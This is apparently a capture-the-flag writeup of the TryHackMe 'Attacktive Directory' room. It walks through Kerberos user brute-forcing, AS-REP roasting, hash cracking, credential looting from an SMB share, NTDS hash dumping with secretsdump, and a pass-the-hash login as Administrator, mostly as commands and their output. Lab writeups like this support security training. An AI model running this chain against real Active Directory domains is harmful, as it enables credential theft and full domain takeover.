---
title: Attacktive Directory – Writeup
---

_**Nov 12, 2020**_

[Attacktive Directory](https://tryhackme.com/room/attacktivedirectory) Writeup

### Description :

99% of Corporate networks run off Active Directory. From this machine you will have a basic understanding on how to exploit such an environment.

Learning Objectives :

* AD Enumeration
* Kerberos
* Cracking Hashes
* Impacket
* ASREPRoasting


## Recon :

```
bvr0n@kali:~$ nmap -sC -sV 10.10.193.34
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-12 06:56 EST
Nmap scan report for 10.10.193.34
Host is up (0.091s latency).
Not shown: 990 closed ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-11-12 11:56:26Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2020-11-12T11:58:44+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2020-09-16T22:48:24
|_Not valid after:  2021-03-18T22:48:24
|_ssl-date: 2020-11-12T11:58:59+00:00; +2s from scanner time.
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-11-12T11:58:49
|_  start_date: N/A
```
From this scan we discover the Domain Name of the machine as well as the the full AD domain.

For further enumeration we need to add domain name and add it to `/etc/hosts`

```
bvr0n@kali:~$ echo 10.10.193.34 spookysec.local >> /etc/hosts
```

```
root@kali:~# enum4linux -a spookysec.local
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Nov 12 15:15:56 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... spookysec.local
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ======================================================= 
|    Enumerating Workgroup/Domain on spookysec.local    |
 ======================================================= 
[+] Got domain/workgroup name: THM-AD

 =============================================== 
|    Nbtstat Information for spookysec.local    |
 =============================================== 
Looking up status of 10.10.193.34
        ATTACKTIVEDIREC <00> -         B <ACTIVE>  Workstation Service
        THM-AD          <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        THM-AD          <1c> - <GROUP> B <ACTIVE>  Domain Controllers
        THM-AD          <1b> -         B <ACTIVE>  Domain Master Browser
        ATTACKTIVEDIREC <20> -         B <ACTIVE>  File Server Service

        MAC Address = 02-4D-80-A3-99-4E

 ======================================== 
|    Session Check on spookysec.local    |
 ======================================== 
[+] Server spookysec.local allows sessions using username '', password ''

 ============================================== 
|    Getting domain SID for spookysec.local    |
 ============================================== 
Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963
[+] Host is part of a domain (not a workgroup)
```

## Kerberos Enumeration :

Kerbrute is a tool that performs Kerberos pre-auth bruteforcing, in this case we will be using the username bruteforce feature.

```
bvr0n@kali:~/Kerbute$ ./kerbrute_linux_amd64 userenum -d spookysec.local  --dc spookysec.local ~/CTF/THM/AttacktiveDirect/userlist.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/12/20 - Ronnie Flathers @ropnop

2020/11/12 07:59:40 >  Using KDC(s):
2020/11/12 07:59:40 >   spookysec.local:88

2020/11/12 07:59:41 >  [+] VALID USERNAME:       james@spookysec.local
2020/11/12 07:59:43 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2020/11/12 07:59:45 >  [+] VALID USERNAME:       James@spookysec.local
2020/11/12 07:59:46 >  [+] VALID USERNAME:       robin@spookysec.local
2020/11/12 07:59:54 >  [+] VALID USERNAME:       darkstar@spookysec.local
2020/11/12 08:00:00 >  [+] VALID USERNAME:       administrator@spookysec.local
2020/11/12 08:00:10 >  [+] VALID USERNAME:       backup@spookysec.local
2020/11/12 08:00:16 >  [+] VALID USERNAME:       paradox@spookysec.local
2020/11/12 08:00:46 >  [+] VALID USERNAME:       JAMES@spookysec.local
2020/11/12 08:00:56 >  [+] VALID USERNAME:       Robin@spookysec.local
2020/11/12 08:01:59 >  [+] VALID USERNAME:       Administrator@spookysec.local
2020/11/12 08:04:12 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2020/11/12 08:04:55 >  [+] VALID USERNAME:       Paradox@spookysec.local
2020/11/12 08:07:53 >  [+] VALID USERNAME:       ori@spookysec.local
2020/11/12 08:09:07 >  [+] VALID USERNAME:       ROBIN@spookysec.local
```
### ASREPRoasting :

Now that we have discovered a several usernames we can use a technique called ASREPRoasting, meaning if a user does not have the Kerberos preauthentication property selected it is possible to retrieve the password hash from that user. 
Impacket provides a tool called GetNPUsers.py which can query the AD and if the property above is not selective it will export their TGT.

```
bvr0n@kali:/opt/impacket/examples$ python3 GetNPUsers.py spookysec.local/svc-admin -no-pass
Impacket v0.9.22.dev1+20201105.154342.d7ed8dba - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a9ba7723b142129ccf7d864d21ad5804$2e43b826b31c08cc1bc3633b7d916dbaacf5c6dec0bfbb097e4955bd8d225906367c230dcdf5e68a84ff0f4d473c87d4a1d7b552631a33b4e6a995a58d88239911cf23961bc3a5f5b756d0dfbfec4936ad7f2df721ed007279aaf5e6536b6076799eb906d76331830cbd0ecfcfe17d30cdde4d16ec032d590f53379b12700fb6e9cf56b493856f342b43400f11d63c2d6915c5baf81d2cfb0b75aa106e33f73a85c28ef8ca4b55dc4efdf817c9ec8097e92e84460179ba90a5a771314a13e781daf2b3d6457bb595ebc8000b20c2c845f6efe97ba57c168cee57ccd883cf6eeae0d2ec731b4d48d0573f86abffd760e5b5b0
```
Since we were able to get the svc-admin hash, Let's decrypt it now :

```
bvr0n@kali:~/CTF/THM/AttacktiveDirect$ sudo john hash-svc-admin --wordlist=/home/bvr0n/Documents/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
management****   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)
```

## SMB Recon :

Since we have user credentials we can attempt to log into SMB and explore any shares from the domain controller.

```
bvr0n@kali:~/Kerbute$ smbclient -U svc-admin -L 10.10.193.34 
Enter WORKGROUP\svc-admin's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```
Enumerating the shares, one had some credentials inside :

```
bvr0n@kali:~/Kerbute$ smbclient -U svc-admin //10.10.193.34/backup
Enter WORKGROUP\svc-admin's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020
```
The file content is `base64` encoded, we can decoded simply like this :

```
bvr0n@kali:~/CTF/THM/AttacktiveDirect$ strings backup_credentials.txt | base64 -d
backup@spookysec.local:******2517860
```
Using the backup account we can use another tool from Impacket this time called `secretsdump.py`, we will be able to get all the password hashes that this user account has access to.

```
bvr0n@kali:~/CTF/THM/AttacktiveDirect$ python3 /opt/impacket/examples/secretsdump.py -just-dc backup@spookysec.local
Impacket v0.9.22.dev1+20201105.154342.d7ed8dba - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:********************7260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
```
Now we are in possession of the Administrator password hash. The next step will be performing a `Pass the Hash Attack`. 

```
bvr0n@kali:~/CTF/THM/AttacktiveDirect$ evil-winrm -i 10.10.193.34 -u Administrator -H ********************7260b0bcb4fc

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator> whoami
thm-ad\administrator
```
##### Congratulations, you now have complete access to the system. Hope you enjoyed this guide. :)


